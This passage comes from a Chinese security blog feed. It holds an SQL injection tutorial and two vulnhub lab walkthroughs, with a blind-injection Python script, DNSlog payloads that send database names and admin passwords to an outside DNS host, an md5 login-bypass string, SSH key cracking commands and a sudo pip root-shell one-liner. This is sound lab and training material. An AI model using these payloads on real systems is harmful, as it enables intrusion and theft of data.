class="variable">$sql</span>))&#123;</span><br><span class="line">        <span class="variable">$sql</span>  = <span class="string">&quot;insert into `user`(`username`,`passwd`,`role`) values (&#x27;admin&#x27;,&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">randStr</span>()).<span class="string">&quot;&#x27;,&#x27;admin&#x27;)&quot;</span>;</span><br><span class="line">        <span class="variable">$conn</span> -&gt; <span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">      <span class="variable">$filter</span> = <span class="string">&quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%09&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0b&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0c&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0d&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%a0&#x27;</span>).<span class="string">&quot;/i&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$filter</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t input this illegal char!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">  &#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">global</span> <span class="variable">$conn</span>;</span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;select role from `user` where username =&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">   <span class="variable">$res</span> = <span class="variable">$conn</span> -&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$username</span> is &quot;</span>.<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()[<span class="string">&#x27;role&#x27;</span>];</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t have this user!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">global</span> <span class="variable">$conn</span>;</span><br><span class="line">     <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">     <span class="variable">$username</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$username</span>));</span><br><span class="line">     <span class="variable">$passwd</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$passwd</span>));</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$username</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t login this as admin!&quot;</span>);</span><br><span class="line">     &#125;  </span><br><span class="line">     <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where username=&#x27;&quot;</span>.<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">escape_string</span>(<span class="variable">$username</span>).<span class="string">&quot;&#x27; and passwd=&#x27;&quot;</span>.<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">escape_string</span>(<span class="variable">$passwd</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">     <span class="variable">$res</span> = <span class="variable">$conn</span> -&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()[<span class="string">&#x27;role&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) <span class="keyword">exit</span>(<span class="variable">$flag</span>);</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;sorry,username or passwd error!&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> &#125;</span><br><span class="line">  <span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])?<span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]):<span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="variable">$passwd</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])?<span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]):<span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="variable">$action</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])?<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]):<span class="string">&quot;source&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$action</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;source&quot;</span>: <span class="title function_ invoke__">source</span>(); <span class="keyword">break</span> ;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;login&quot;</span> : <span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$passwd</span>);<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;show&quot;</span> : <span class="title function_ invoke__">show</span>(<span class="variable">$username</span>);<span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们注意到filter()函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = <span class="string">&quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;</span>.urldecode(<span class="string">&#x27;%09&#x27;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&quot;%0b&quot;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&#x27;%0c&#x27;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&#x27;%0d&#x27;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&#x27;%a0&#x27;</span>).<span class="string">&quot;/i&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里看起来过滤的比较多，其中and，or还有&amp;，|都被过滤了，这个时候就可以利用false进行盲注。</p><p>可以在show函数利用查询的时候注入，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="string">&quot;admin&#x27;^!(mid((passwd)from(-&#123;pos&#125;))=&#x27;&#123;passwd&#125;&#x27;)=&#x27;1&quot;</span></span><br></pre></td></tr></table></figure><p>这里官方给出的就是利用异或，其实这里并不需要 admin 只要是一串字符串就可以</p><p>异或会使字符串都转为浮点型，都变为了0，由于0&#x3D;0^0 -&gt; 1^0 -&gt; 1 当然对于这个题并不一定利用这个，直接截取字符串作比较就可以，但是这里只是提供一种姿势，由于mysql的灵活，其花样也比较多还有就是构造的payload比较简短，例如’+’、’^’、’&#x2F;4#’ 这样只有三个字符便可以绕过登录，简单粗暴，还有就是类似的文章不多，许多开发人员容易忽视这些细节。</p><p><strong>盲注脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">str</span> <span class="keyword">in</span> <span class="string">&quot;abcdefghijklmnopkrstuvwxyz&quot;</span>:</span><br><span class="line">        url = <span class="string">&quot;http://cc248a80-6376-49cf-b846-16c188eeb1fc.node3.buuoj.cn/Less-8/?id=&#x27;^(mid((select database())from(-&#123;0&#125;))=&#x27;&#123;1&#125;&#x27;)=&#x27;1&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">str</span>+flag)</span><br><span class="line">        res = requests.get(url=url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag = <span class="built_in">str</span>+flag</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h3><p><strong>原理</strong><br>通过子查询，将内容拼接到域名内，让load_file()去访问共享文件，访问的域名被记录此时变为显错注入,将盲注变显错注入,读取远程共享文件，通过拼接出函数做查询,拼接到域名中，访问时将访问服务器，记录后查看日志。</p><p>在无法直接利用的情况下，但是可以通过DNS请求,通过DNSlog，把数据外带，用DNS解析记录查看。</p><p>LOAD_FILE() 读取文件的函数<br>读取文件并返回文件内容为字符串。</p><p>要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接受的数据包大小函数，默认1MB）。 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p><p>注：这个功能不是默认开启的，需要在mysql配置文件加一句 secure_file_priv&#x3D;</p><p><strong>DNSLOG平台</strong>:<br><a href="https://dns.咕.com/">https://dns.xn--9tr.com/</a></p><p><a href="https://log.咕.com/">https://log.xn--9tr.com/</a></p><p><strong>UNC路径</strong><br>UNC路径通用命名规则，也称通用命名规范、通用命名约定，类似\softer这样的形式的网络路径。</p><p>UNC路径的 格式 ：\server\sharename\directory\filename</p><p>等同于SELECT LOAD_FILE(‘&#x2F;&#x2F;库名.1806dl.dnslog.cn&#x2F;abc’</p><p>去访问 库名.1806dl.dnslog.cn 的服务器下的共享文件夹abc。</p><p>然后1806dl.dnslog.cn的子域名的解析都是在某台服务器，然后他记录下来了有人请求访问了error.1806dl.dnslog.cn，然后在DnsLog这个平台上面显示出来了</p><p>payload示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&#x27;//&#x27;</span>, database(),<span class="string">&#x27;.htleyd.dnslog.cn/abc&#x27;</span>))</span><br><span class="line">?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&#x27;//&#x27;</span>, (select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1 ),<span class="string">&#x27;.htleyd.dnslog.cn/abc&#x27;</span>))</span><br><span class="line">?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&#x27;//&#x27;</span>,(select column_name from information_schema.columns <span class="built_in">where</span> table_name=’admin’ and table_schema=database() <span class="built_in">limit</span> 2,1),<span class="string">&#x27;.htleyd.dnslog.cn/abc&#x27;</span>))</span><br><span class="line">?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&#x27;//&#x27;</span>,(select password from admin <span class="built_in">limit</span> 0,1),<span class="string">&#x27;.htleyd.dnslog.cn/abc&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="‘“-md5-pass-true-”‘-登录绕过"><a href="#‘“-md5-pass-true-”‘-登录绕过" class="headerlink" title="‘“.md5($pass,true).”‘ 登录绕过"></a>‘“.md5($pass,true).”‘ 登录绕过</h3><p>很多站点为了安全都会利用这样的语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE password = <span class="string">&#x27;.md5($password,true).&#x27;</span>;</span><br></pre></td></tr></table></figure><p>md5(string,true) 函数在指定了true的时候，是返回的原始 16 字符二进制格式，也就是说会返回这样子的字符串：’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c：<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241621318.png"></p><p>这不是普通的二进制字符串，而是 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种，这样的话就会和前面的形成闭合，构成万能密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE password = <span class="string">&#x27;&#x27;</span>or<span class="string">&#x27;6.......&#x27;</span></span><br></pre></td></tr></table></figure><p>但是我们思考一下为什么 6\xc9]\x99\xe9!r,\xf9\xedb\x1c 的布尔值是true呢？</p><p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数（这类似于PHP的弱类型）。要注意的是这种情况是必须要有单引号括起来的，比如 password&#x3D;‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password&#x3D;‘xxx’ or 1 ，也就相当于 password&#x3D;‘xxx’ or true，所以返回值就是true。这里不只是1开头，只要是数字开头都是可以的。当然如果只有数字的话，就不需要单引号，比如 password&#x3D;‘xxx’ or 1，那么返回值也是 true。（xxx指代任意字符）</p><p>接下来就是找到这样子的字符串，这里给出两个吧。</p><p>ffifdyop：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: <span class="string">&#x27;or&#x27;</span>6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line">string: <span class="string">&#x27;or&#x27;</span>6]!r,b</span><br></pre></td></tr></table></figure><p>129581926211651571912466741651878684928：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line">raw: \x06\xdaT0D\x9f\x8fo<span class="comment">#\xdf\xc1&#x27;or&#x27;8</span></span><br><span class="line">string: T0Do<span class="comment">#&#x27;or&#x27;8</span></span><br></pre></td></tr></table></figure><p>转载至  <a href="https://xz.aliyun.com/t/10594#toc-3">https://xz.aliyun.com/t/10594#toc-3</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;SQL注入漏洞&quot;&gt;&lt;a href=&quot;#SQL注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;SQL注入漏洞&quot;&gt;&lt;/a&gt;SQL注入漏洞&lt;/h1&gt;&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;随着互联网web和信息技术的发展，在web后端作为存储和管理的的数据库也得到了广泛的应用，与web结合较为紧密的数据库包括Mysql，Sqlserver，Oracle，Sqllite，Db2，Access等等。 数据存储和管理作为应用的一个基本需求，在绝大多数的应用里都得到了使用，这种大面积的使用也意味着在数据库操作方面如果处理不当出现问题的可能性会很大，另外一方面由于数据库承载了应用的数据信息，如果数据库出现问题一方面可能导致敏感数据的泄露和篡改（如信用卡账户，用户密码，管理账户和密码，销售记录等等），直接导致损失和应用被攻陷，另外一方面，即使数据库中不承载较为敏感的信息，由于数据库的特殊性，数据库被攻击的话也可以直接导致应用程序崩溃及其他严重的后果。&lt;/p&gt;
&lt;h2 id=&quot;漏洞成因&quot;&gt;&lt;a href=&quot;#漏洞成因&quot; class=&quot;headerlink&quot; title=&quot;漏洞成因&quot;&gt;&lt;/a&gt;漏洞成因&lt;/h2&gt;&lt;p&gt;应用为了和数据库进行沟通完成必要的管理和存储工作，必须和数据库保留一种接口。目前的数据库一般都是提供api以支持管理，应用使用底层开发语言如Php，Java，asp，Python与这些api进行通讯。对于数据库的操作，目前普遍使用一种SQL语言（Structured Query Language语言，SQL语言的功能包括增删查改等，是一个综合的、通用的关系数据库语言，同时又是一种高度非过程化的语言，只要求用户指出做什么而不需要指出怎么做），SQL作为字符串通过API传入给数据库，数据库将查询的结果返回，数据库自身是无法分辨传入的SQL是合法的还是不合法的，它完全信任传入的数据，如果传入的SQL语句被恶意用户控制或者篡改，将导致数据库以当前调用者的身份执行预期之外的命令并且返回结果，导致安全问题。 那么恶意用户如何才能控制传入的SQL语句呢？我们知道，既然传入的SQL是以字符串的方式传入的，这个字符串由应用生成，那么如果应用生成这个字符串的方式不对就可能导致问题，譬如考虑如下的功能：&lt;/p&gt;</summary>
    
    
    
    <category term="笔记" scheme="https://syst1m.top/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="sql注入" scheme="https://syst1m.top/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-EmpireBreakout</title>
    <link href="https://syst1m.top/2022/06/22/vulnhub-breakout%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/22/vulnhub-breakout%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-22T07:40:10.000Z</published>
    <updated>2022-06-22T08:53:22.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目  <a href="https://www.vulnhub.com/entry/empire-breakout,751/">https://www.vulnhub.com/entry/empire-breakout,751/</a><br>靶机:172.16.17.152<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>使用nmap对靶机进行扫描 开启了三个web服务,和2个smb服务<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221547410.png"></p><p>445高危端口,尝试exp打445端口,失败,继续往下看80端口<br>apache,在前端源码里找到提示和加密密文<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221606870.png"></p><p>挨个尝试解密,最后为Brainfuck加密,解出明文为 .2uqPEfj3D&lt;P’a-3 应该是某个账号的密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221609231.png"></p><p>挨个访问10000&#x2F;20000端口,都是登录页面,没有利用的点<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221612140.png"></p><h2 id="smb嗅探"><a href="#smb嗅探" class="headerlink" title="smb嗅探"></a>smb嗅探</h2><p>想到smb服务还没有利用到,回过头继续看smb服务<br>enum4linux 对靶机进行嗅探,爆出了一个用户名 cyber</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enum.exe的Linux替代软件，用于枚举Windows和Samba主机中的数据。</span><br><span class="line">enum4linux 172.16.17.152</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221615489.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>登录成功,发现有个地方可以直接执行命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221619772.png"></p><p>反弹shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221622849.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221622106.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看root权限执行的命令,和文件,没有sudo命令,没有利用的点<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221627684.png"></p><p>拿到第一个flag和一个root权限的 tar命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221630268.png"></p><p>既然有tar,那么就要用到压缩 解压去提权,最后在&#x2F;var&#x2F;backups下翻到一个密码备份文件<br>对密码的备份文件进行压缩，然后解压即可么访问拿到密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./tar -czvf test.tar.gz /var/backups/.old_pass.bak</span><br><span class="line">tar -xzvf test.tar.gz</span><br><span class="line"><span class="built_in">cat</span> var/backups/.old_pass.bak</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221650882.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221649498.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目  &lt;a href=&quot;https://www.vulnhub.com/entry/empire-breakout,751/&quot;&gt;https://www.vulnhub.com/entry/empire-breakout,751/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.152&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;使用nmap对靶机进行扫描 开启了三个web服务,和2个smb服务&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206221547410.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;445高危端口,尝试exp打445端口,失败,继续往下看80端口&lt;br&gt;apache,在前端源码里找到提示和加密密文&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206221606870.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>vulnhub-EmpireLupinOne打靶</title>
    <link href="https://syst1m.top/2022/06/21/vulnhub-Empire%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/21/vulnhub-Empire%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-21T10:10:30.000Z</published>
    <updated>2022-06-22T07:50:01.542Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/series/empire,507/">https://www.vulnhub.com/series/empire,507/</a><br>靶机:172.16.17.151<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描确定靶机ip,再详细扫描<br>开放了22和80,扫出一个&#x2F;~myfiles目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211837023.png"></p><p>访问看看,提示404,暗示我们继续尝试当前目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211838965.png"></p><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>wfuzz继续扫当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://172.16.17.151/~FUZZ</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211859278.png"></p><p>提示我们icex64用户有ssh秘钥,并使用fasttrack去爆破<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211901501.png"></p><p>继续爆破,扫出一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,403 -u http://172.16.17.151/~secret/.FUZZ.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211916638.png"></p><p>但是应该是加密过的,不是ssh密钥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211917480.png"></p><p>拿去解密,挨个尝试后,以base58解出秘钥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211922436.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="爆破秘钥"><a href="#爆破秘钥" class="headerlink" title="爆破秘钥"></a>爆破秘钥</h2><p>使用ssh2john将秘钥编译一下,再使用john暴力破解,解出密码 P@55w0rd!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh2john key.txt &gt; passkey.txt</span><br><span class="line">                                                                                                                                                                                                              </span><br><span class="line">john --wordlist=/usr/share/wordlists/fasttrack.txt passkey.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211929056.png"></p><h2 id="尝试登录"><a href="#尝试登录" class="headerlink" title="尝试登录"></a>尝试登录</h2><p>直接登录被拒绝<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211932835.png"></p><p>利用秘钥再次登录,此处要注意,先将秘钥权限改为 600<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211938634.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在家目录下看到一个user.txt,拿到第一个flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211946639.png"></p><p>查看root权限运行的文件,没有写入权限,继续往下看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211941860.png"></p><p>发现使用webbrowser包,跟进看看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211952250.png"></p><p>是root权限<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211953957.png"></p><p>写入shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212014187.png"></p><p>运行heist.py反弹shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212015303.png"></p><p>查看arsene用户下以root权限运行的命令或文件,发现pip不需要密码就可以执行<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212016681.png"></p><p>google pip提权 找到方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arsene@LupinOne:~$ TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line">arsene@LupinOne:~$ <span class="built_in">echo</span> <span class="string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">arsene@LupinOne:~$ sudo pip install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212029257.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/series/empire,507/&quot;&gt;https://www.vulnhub.com/series/empire,507/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.151&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;nmap扫描确定靶机ip,再详细扫描&lt;br&gt;开放了22和80,扫出一个&amp;#x2F;~myfiles目录&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206211837023.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;访问看看,提示404,暗示我们继续尝试当前目录&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206211838965.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
